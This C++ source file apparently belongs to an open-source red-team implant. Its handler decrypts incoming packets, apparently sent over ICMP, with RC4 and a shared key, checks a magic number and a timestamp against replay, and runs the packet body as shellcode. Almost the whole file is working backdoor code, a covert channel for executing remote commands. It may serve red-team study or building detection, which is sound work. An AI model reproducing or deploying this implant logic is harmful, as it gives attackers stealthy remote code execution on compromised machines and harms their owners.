//
// MIT License
//
// Copyright (c) 2019 Rokas Kupstys
//
// Permission is hereby granted, free of charge, to any person obtaining a
// copy of this software and associated documentation files (the "Software"),
// to deal in the Software without restriction, including without limitation
// the rights to use, copy, modify, merge, publish, distribute, sublicense,
// and/or sell copies of the Software, and to permit persons to whom the
// Software is furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in
// all copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL
// THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
// FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
// DEALINGS IN THE SOFTWARE.
//
#include <stdint.h>
#include "../shared/debug.h"
#include "../shared/process_hollowing.h"
#include "../shared/win32.h"
#include "../shared/rc4.h"
#include "../shared/shellcode.h"
#include "../config.h"
#include "context.h"


static const unsigned icmp_magic_v1 = 0xdfc14973;

// When adding new action take care to also keep same action id in vr.py
enum icmp_action
{
    icmp_action_shellcode = 0,
};

#pragma pack(1)
struct vr_payload
{
    uint32_t magic;
    uint32_t timestamp;
    uint8_t action;
};
#pragma pack()

struct payload_data
{
    uint8_t* data;
    unsigned len;
};

bool handle_payload(context& ctx, uint8_t* data, unsigned len)
{
    if (len < sizeof(vr_payload))
        return false;

    auto* payload = reinterpret_cast<vr_payload*>(data);

    // deobfuscate
    rc4_ctx rc{};
    rc4_init(&rc, vr_shared_key);
    rc4_xor(&rc, (uint8_t*)payload, len);

    // entire packet is in network byte order
    payload->magic = ntohl(payload->magic);
    payload->timestamp = ntohl(payload->timestamp);

    if (payload->magic != icmp_magic_v1)
        return false;

    if (ctx.payload_last_timestamp >= payload->timestamp)
        return false;

    ctx.payload_last_timestamp = payload->timestamp;

    switch (payload->action)
    {
    case icmp_action_shellcode:
    {
        auto* shellcode = data + sizeof(vr_payload);
        unsigned shellcode_len = len - sizeof(vr_payload);
        shellcode_spawn(shellcode, shellcode_len);
        break;
    }
    default:
        LOG_WARNING("Unknown icmp action %d", payload->action);
        return false;
    }

    return true;
}
